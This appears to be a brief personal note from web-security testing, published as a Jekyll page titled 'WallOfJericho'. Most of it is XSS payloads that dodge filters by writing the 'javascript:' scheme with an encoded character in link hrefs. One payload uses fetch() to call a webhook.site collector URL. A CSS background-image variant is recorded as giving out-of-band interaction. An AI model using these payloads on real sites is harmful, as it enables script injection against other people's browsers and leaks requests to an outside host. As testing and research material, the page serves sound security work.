---
layout: default
title: WallOfJericho
---
```js
<a href="javascrip&#0000116:alert('Successful XSS')">Click this link!</a>

<a href="javascrip&#0000116:fetch('https://webhook.site/01a34acf-4624-4fd2-abfc-d0bdbc6ffbed')">CLICK ME PLSSS</a>
```

successful XSS on click.

I tried here with `javascrip&#0000116`, it hasn't being decoded.
```js
<div style="background-image:url(javascrip&#0000116:alert('Successful XSS'))">
```
However, we got OOB:
```js
<div style="background-image:url('https://webhook.site/01a34acf-4624-4fd2-abfc-d0bdbc6ffbed')">
```
